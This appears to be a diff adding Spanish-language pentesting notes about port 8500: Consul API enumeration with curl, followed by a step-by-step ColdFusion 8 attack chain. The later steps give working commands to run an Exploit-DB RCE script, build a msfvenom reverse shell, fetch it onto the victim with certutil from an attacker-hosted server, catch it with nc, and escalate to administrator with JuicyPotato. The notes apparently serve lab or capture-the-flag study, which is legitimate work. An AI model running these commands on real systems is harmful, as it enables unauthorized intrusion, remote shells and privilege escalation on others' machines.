@@ -1,0 +1,162 @@
+🌐 Flight Message Transfer Protocol (FMTP) 8500/TCP suele estar asociado a:
+
+    · HashiCorp Consul
+    · ColdFusion de Macromedia/Adobe.
+    · EMC2 (Legato) Networker o Sun Solstice Backup. 
+    · QuickTime Streaming Server (en UDP). 
+    · Flight Data Exchange (FDE).
+    · Web service / iTunes Radio streams (IRDMI). 
+
+🧠 ¿Qué es Consul?
+
+    Consul es una herramienta usada para:
+
+        · Service discovery (descubrir servicios en una red)
+        · Gestión de configuraciones
+        · Service mesh (comunicación entre microservicios)
+
+    👉 Muy común en entornos:
+
+        · DevOps
+        · Cloud
+        · Kubernetes
+
+⚙️ ¿Qué corre en el puerto 8500?
+
+    Normalmente:
+
+        · Interfaz web (HTTP API)
+        · Panel de control
+        · API REST para interactuar con servicios
+
+🧪 ¿Cómo identificarlo?
+
+    Si haces:
+
+        nmap -p 8500 <IP>
+
+    Y luego accedes:
+
+        http://<IP>:8500
+
+    Suele aparecer una interfaz web de Consul
+
+🔐 Uso en ciberseguridad (muy importante)
+
+    🚨 Problema típico
+
+        Muchas veces está SIN autenticación
+
+    🔥 ¿Qué puede hacer un atacante?
+
+        🔹 1. Enumeración
+
+            · Ver servicios internos
+            · Ver nodos de la red
+            · Obtener IPs internas
+
+        🔹 2. Acceso a información sensible
+
+            · Configuraciones
+            · Variables
+            · Posibles secretos
+
+        🔹 3. Ejecución remota (muy crítico)
+
+            · Consul permite registrar servicios con comandos → esto puede llevar a:
+
+                RCE (Remote Code Execution)
+
+    💣 Ejemplo típico de abuso
+
+        · Registrar un servicio malicioso
+        · Hacer que el sistema lo ejecute
+        · Obtener shell
+
+🔧 Comandos útiles
+
+    Ver info básica
+
+        curl http://<IP>:8500/v1/status/leader
+
+    Listar nodos
+
+        curl http://<IP>:8500/v1/catalog/nodes
+
+    Listar servicios
+
+        curl http://<IP>:8500/v1/catalog/services
+
+⚠️ Señales de vulnerabilidad
+
+    · Acceso web sin login
+    · API responde sin autenticación
+    · Puedes listar nodos/servicios
+
+    👉 = muy mala configuración
+
+🎯 Ejemplo de uso básico
+
+    1. Acceder a la web con el puerto 8500
+
+        http://<IP>:8500
+
+    2. Buscar algún recurso de login
+
+    3. Probar un ataque de fuerza bruta
+
+    4. Buscar en el navegador posibles vulnerabilidades y/o exploits
+
+        ➡️ Adobe ColdFusion 8
+
+            Remote Command Execution (RCE) → https://www.exploit-db.com/exploits/50057
+
+                1. Descargar el script en nuestro local
+                2. Cambiar los parámetros LHOST y RHOST por los que correspondan 
+                3. Ejecutar el script con el siguiente comando: 
+
+                    python3 50057.py
+
+                4. Realizar una escalada de privilegios
+
+                    a. Ejecutar comando:
+                    
+                        systeminfo
+
+                    b. Comprobar el sistema operativo: 
+
+                        Server 2008 R2
+
+                    c. Comprobar los privilegios que tiene el usuario 
+
+                        whoami /priv
+
+                    d. Si tiene el privilegio "SeImpersonatePrivilege" en "Enabled" se podrá crear una reverse shell (en la máquina local) con msfvenom usando el siguiente comando: 
+
+                        msfvenom -p windows/shell_reverse_tcp LHOST=<IP_LOCAL> LPORT=9001 -f exe -a x86 --platform windows -o shell.exe
+
+                    e. Descargarse en la misma ruta donde estamos trabajando la herramienta JuicyPotato desde el siguiente repositorio: 
+
+                        https://github.com/ohpe/juicy-potato/releases/tag/v0.1
+
+                    f. Transferir el archivo shell.exe a la máquina víctima. Para ello se crea un listener en una terminal nueva, en la misma ruta usando el siguiente comando: 
+
+                        python3 -m http.server 80
+
+                    g. En la máquina víctima, introducimos el siguiente comando para subir shell.exe a la máquina víctima: 
+
+                        certutil -urlcache -f http://<IP_LOCAL>/shell.exe C:\Users\Public\shell.exe
+
+                    h. Realizamos la misma acción anterior, pero esta vez para subir el archivo de JuicyPotato: 
+
+                        certutil -urlcache -f http://<IP_LOCAL>/JuicyPotato.exe C:\Users\Public\potato.exe
+
+                    i. Ejecutamos un listener en nuestra máquina local: 
+
+                        nc -lvnp 9001
+
+                    j. En la máquina víctima, nos vamos a la ruta /Public (donde están los ficheros) y ejecutamos potato.exe usando el siguiente comando: 
+
+                        C:\Users\Public\potato.exe -t * -p "C:\Users\Public\shell.exe" -l 1337
+
+                5. Ejecutamos el comando whoami para comprobar que estamos dentro de administrador. 
